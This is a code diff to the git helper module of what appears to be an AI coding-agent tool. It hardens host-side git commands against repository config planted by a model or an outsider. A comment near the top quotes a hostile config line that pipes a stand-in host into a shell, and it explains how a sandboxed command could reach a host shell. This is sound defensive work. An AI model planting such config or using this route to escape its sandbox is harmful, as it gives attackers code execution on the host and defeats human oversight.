@@ -1,5 +1,7 @@
+import { execFileSync } from "node:child_process";
 import { existsSync, readFileSync, statSync } from "node:fs";
 import { join } from "node:path";
+import { allowedEnv } from "./executor";
 import { runShell, type ShellResult } from "./shell";
 import type { GitOp } from "./git-ops";
 
@@ -38,6 +40,86 @@ export function isRepo(root: string): boolean {
   return existsSync(join(dotGit, "HEAD"));
 }
 
+// Every git command here runs on the host, outside any sandbox, in a
+// directory whose contents may have been written by a model or uploaded by a
+// stranger. Git is not a passive reader of that directory: its config can name
+// programs to run (core.fsmonitor, hooks, pagers, diff and filter drivers,
+// gpg.program), and `git status` or `git add` runs them. A planted
+// `.git/config` with `core.fsmonitor = curl evil | sh` was a host shell on the
+// next checkpoint. Workspace.write refuses `.git/` now, but a sandboxed command
+// shares the workspace mount and can still write there, so the commands
+// themselves must not trust the config they find.
+//
+// Command-line `-c` beats every config file, so the fixed overrides below win.
+// Drivers are named by the config itself and cannot be switched off by a fixed
+// flag, so each one found is blanked individually. git-lfs is the one driver
+// left alone, and only with its stock commands: disabling it would commit raw
+// binaries into a repository that relies on it.
+const FIXED_OVERRIDES = [
+  "core.fsmonitor=false",
+  "core.hooksPath=/dev/null",
+  "core.pager=cat",
+  "core.alternateRefsCommand=",
+  "diff.external=",
+  "commit.gpgSign=false",
+  "tag.gpgSign=false",
+  "protocol.ext.allow=never",
+];
+
+/** The commands `git lfs install` writes, with and without `--skip`. */
+const LFS_COMMAND = /^git-lfs (clean -- %f|smudge( --skip)? -- %f|filter-process( --skip)?)$/;
+
+/** Driver keys that name a program, as `section.<name>.key`. */
+const DRIVER_KEY = /^(filter|diff|merge)\.(.+)\.(clean|smudge|process|textconv|command|driver)$/i;
+
+/** The environment git runs with: the executor's allow-list, never the
+ *  parent's secrets, and nothing that could prompt or page. */
+export function gitEnv(): NodeJS.ProcessEnv {
+  return allowedEnv(process.env, { GIT_TERMINAL_PROMPT: "0", GIT_PAGER: "cat", PAGER: "cat" });
+}
+
+/** `-c` overrides for every program-naming key the config at `root` sets. */
+export function driverOverrides(root: string): string[] {
+  let listing = "";
+  try {
+    // `git config --list` reads config and runs nothing from it.
+    listing = execFileSync("git", ["config", "--list", "-z"], {
+      cwd: root,
+      env: gitEnv(),
+      encoding: "utf8",
+      timeout: 10_000,
+      stdio: ["ignore", "pipe", "ignore"],
+    });
+  } catch {
+    return [];
+  }
+  const out = new Set<string>();
+  for (const entry of listing.split("\0")) {
+    if (!entry) continue;
+    const nl = entry.indexOf("\n");
+    const key = nl === -1 ? entry : entry.slice(0, nl);
+    const value = nl === -1 ? "" : entry.slice(nl + 1);
+    const match = DRIVER_KEY.exec(key);
+    if (!match) continue;
+    if (match[1].toLowerCase() === "filter" && LFS_COMMAND.test(value.trim())) continue;
+    out.add(`${key}=`);
+  }
+  return [...out];
+}
+
+/** The `git` prefix every host invocation uses, overrides included. */
+export function safeGit(root: string): string {
+  return [
+    "git",
+    ...[...FIXED_OVERRIDES, ...driverOverrides(root)].flatMap((o) => ["-c", quote(o)]),
+  ].join(" ");
+}
+
+/** Run `git <rest>` in `root` with the overrides and environment above. */
+export function runGit(root: string, rest: string, timeoutMs = 30_000): Promise<ShellResult> {
+  return runShell(`${safeGit(root)} ${rest}`, { cwd: root, timeoutMs, env: gitEnv() });
+}
+
 /** Shell-quote a single argument. Arguments come from a model, so they are
  *  never interpolated raw. */
 function quote(value: string): string {
@@ -50,13 +132,12 @@ export async function git(
   args: string[] = [],
   opts: { timeoutMs?: number } = {},
 ): Promise<ShellResult> {
-  const command = `git ${op} ${args.map(quote).join(" ")}`.trim();
-  return runShell(command, { cwd: root, timeoutMs: opts.timeoutMs ?? 60_000 });
+  return runGit(root, `${op} ${args.map(quote).join(" ")}`.trim(), opts.timeoutMs ?? 60_000);
 }
 
 /** Files git reports as changed, staged or not, relative to the repo root. */
 export async function changedFiles(root: string): Promise<string[]> {
-  const result = await runShell("git status --porcelain", { cwd: root, timeoutMs: 30_000 });
+  const result = await runGit(root, "status --porcelain", 30_000);
   if (!result.ok) return [];
   return result.stdout
     .split("\n")
@@ -84,25 +165,26 @@ export async function checkpoint(root: string, description: string): Promise<Che
   const changed = await changedFiles(root);
   if (changed.length === 0) return { ok: true, sha: null, message: "Nothing to check point." };
 
-  const add = await runShell("git add -A", { cwd: root, timeoutMs: 60_000 });
+  const add = await runGit(root, "add -A", 60_000);
   if (!add.ok) return { ok: false, sha: null, message: add.stderr || "git add failed." };
 
   const subject = `${CHECKPOINT_PREFIX} ${description}`.slice(0, 200);
   // Identity is supplied per-invocation rather than written into the repo's
   // config, so checkpointing never mutates the user's git settings.
-  const commit = await runShell(
-    `git -c user.name='DevStation agent' -c user.email='agent@devstation.online' commit -m ${quote(subject)}`,
-    { cwd: root, timeoutMs: 60_000 },
+  const commit = await runGit(
+    root,
+    `-c user.name='DevStation agent' -c user.email='agent@devstation.online' commit -m ${quote(subject)}`,
+    60_000,
   );
   if (!commit.ok) return { ok: false, sha: null, message: commit.stderr || "git commit failed." };
 
-  const head = await runShell("git rev-parse HEAD", { cwd: root, timeoutMs: 30_000 });
+  const head = await runGit(root, "rev-parse HEAD", 30_000);
   return { ok: true, sha: head.stdout.trim() || null, message: subject };
 }
 
 /** Is HEAD a commit this agent made? */
 export async function headIsCheckpoint(root: string): Promise<boolean> {
-  const result = await runShell("git log -1 --pretty=%s", { cwd: root, timeoutMs: 30_000 });
+  const result = await runGit(root, "log -1 --pretty=%s", 30_000);
   return result.ok && result.stdout.trim().startsWith(CHECKPOINT_PREFIX);
 }
 
@@ -125,8 +207,8 @@ export async function undoCheckpoint(root: string): Promise<{ ok: boolean; messa
         "Undo only ever rewinds the agent's own checkpoints.",
     };
   }
-  const subject = await runShell("git log -1 --pretty=%s", { cwd: root, timeoutMs: 30_000 });
-  const reset = await runShell("git reset --hard HEAD~1", { cwd: root, timeoutMs: 60_000 });
+  const subject = await runGit(root, "log -1 --pretty=%s", 30_000);
+  const reset = await runGit(root, "reset --hard HEAD~1", 60_000);
   if (!reset.ok) return { ok: false, message: reset.stderr || "git reset failed." };
   return { ok: true, message: `Undid ${subject.stdout.trim()}` };
 }
@@ -141,7 +223,7 @@ export async function undoCheckpoint(root: string): Promise<{ ok: boolean; messa
  */
 export async function checkpointBase(root: string): Promise<string | null> {
   if (!isRepo(root)) return null;
-  const log = await runShell("git log --pretty=%H%x09%s -n 200", { cwd: root, timeoutMs: 30_000 });
+  const log = await runGit(root, "log --pretty=%H%x09%s -n 200", 30_000);
   if (!log.ok) return null;
   for (const line of log.stdout.split("\n")) {
     const [sha, ...rest] = line.split("\t");
@@ -173,18 +255,18 @@ export async function agentDiff(root: string, extra: string[] = []): Promise<She
   // liked on the host. The gate did not help, because `diff` classifies as
   // project.inspect, which never asks. Verified exploitable before the fix.
   const args = extra.length > 0 ? ` ${extra.map(quote).join(" ")}` : "";
-  const diff = await runShell(base ? `git diff ${base}${args}` : `git diff HEAD${args}`, {
-    cwd: root,
-    timeoutMs: 60_000,
-  });
+  const diff = await runGit(
+    root,
+    base
+      ? `diff --no-ext-diff --no-textconv ${base}${args}`
+      : `diff --no-ext-diff --no-textconv HEAD${args}`,
+    60_000,
+  );
 
   // A file the agent has just created is untracked, and `git diff` says
   // nothing about untracked files. Leaving them out would reproduce the exact
   // confusion this function exists to prevent, one turn earlier.
-  const untracked = await runShell("git ls-files --others --exclude-standard", {
-    cwd: root,
-    timeoutMs: 30_000,
-  });
+  const untracked = await runGit(root, "ls-files --others --exclude-standard", 30_000);
   const created = untracked.stdout.trim();
   if (!created) return diff;
 
@@ -195,11 +277,11 @@ export async function agentDiff(root: string, extra: string[] = []): Promise<She
 }
 
 export async function agentStatus(root: string): Promise<ShellResult> {
-  const status = await runShell("git status --short", { cwd: root, timeoutMs: 30_000 });
+  const status = await runGit(root, "status --short", 30_000);
   const base = await checkpointBase(root);
   if (!base) return status;
 
-  const since = await runShell(`git diff --name-status ${base}`, { cwd: root, timeoutMs: 30_000 });
+  const since = await runGit(root, `diff --name-status ${base}`, 30_000);
   const changed = since.stdout.trim();
   if (!changed) return status;
 
@@ -215,10 +297,7 @@ export async function agentStatus(root: string): Promise<ShellResult> {
 /** The agent's checkpoints, newest first. */
 export async function listCheckpoints(root: string, limit = 20): Promise<string[]> {
   if (!isRepo(root)) return [];
-  const result = await runShell(`git log -${limit} --pretty=%h%x09%s`, {
-    cwd: root,
-    timeoutMs: 30_000,
-  });
+  const result = await runGit(root, `log -${limit} --pretty=%h%x09%s`, 30_000);
   if (!result.ok) return [];
   return result.stdout
     .split("\n")
